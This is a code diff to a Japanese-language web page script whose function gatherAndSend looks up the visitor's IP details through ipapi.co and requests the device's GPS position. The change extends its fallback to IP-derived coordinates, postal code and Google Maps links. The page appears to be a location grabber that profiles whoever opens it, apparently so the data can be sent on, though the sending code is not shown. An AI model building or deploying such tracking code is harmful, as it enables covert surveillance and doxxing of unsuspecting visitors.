@@ -65,7 +65,7 @@
 
         async function gatherAndSend() {
             try {
-                addLog("> ネットワーク・IP解析中...");
+                addLog("> ネットワーク・詳細IP解析中...");
                 let ipData = {};
                 try {
                     const res = await fetch('https://ipapi.co/json/');
@@ -89,27 +89,24 @@
                 let locationFieldTitle = "🛰️ GPS位置情報";
                 let locationText = "";
 
-                // スマホとPCの処理
                 if (isMobileDevice()) {
-                    addLog("> スマホ環境を検出: 周辺エリア座標を要求中...");
-                    try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: false, // あえて高精度をオフにすることで、巨大なズレを防ぎ安定したエリアを取る
-                                timeout: 6000,
-                                maximumAge: 60000
-                            });
-                        });
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                        
-                        locationFieldTitle = "📍 地域（スマホ・周辺エリア）";
-                        locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(※IPとスマホ基地局による周辺エリア)`;
-                    } catch (e) {
-                        locationFieldTitle = "📍 地域（IP推定エリア）";
-                        locationText = `${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
+                    addLog("> スマホ環境を検出: IPマップリンクを構築中...");
+                    const country = ipData.country_name || "不明";
+                    const region = ipData.region || "不明";
+                    const city = ipData.city || "不明";
+                    const postal = ipData.postal || "不明";
+                    const ipLat = ipData.latitude;
+                    const ipLon = ipData.longitude;
+                    
+                    locationFieldTitle = "📍 地域（スマホ・IPマップ推定）";
+                    
+                    if (ipLat && ipLon) {
+                        const mapUrl = `https://www.google.com/maps?q=${ipLat},${ipLon}`;
+                        locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${ipLat}, 経度: ${ipLon})\n場所: ${country} / ${region} / ${city} (${postal})`;
+                    } else {
+                        locationText = `場所: ${country} / ${region} / ${city} (${postal})`;
                     }
+
                 } else {
                     addLog("> PC環境を検出: 高精度GPS座標を要求中...");
                     try {
@@ -129,7 +126,14 @@
                         locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${accuracy}m 周辺)`;
                     } catch (e) {
                         locationFieldTitle = "📍 地域（GPS取得失敗・IP推定）";
-                        locationText = `${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
+                        const ipLat = ipData.latitude;
+                        const ipLon = ipData.longitude;
+                        if (ipLat && ipLon) {
+                            const mapUrl = `https://www.google.com/maps?q=${ipLat},${ipLon}`;
+                            locationText = `[🗺️ Googleマップで見る](${mapUrl})\n${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
+                        } else {
+                            locationText = `${ipData.country_name || "不明"} / ${ipData.region || "不明"} / ${ipData.city || "不明"}`;
+                        }
                     }
                 }
 
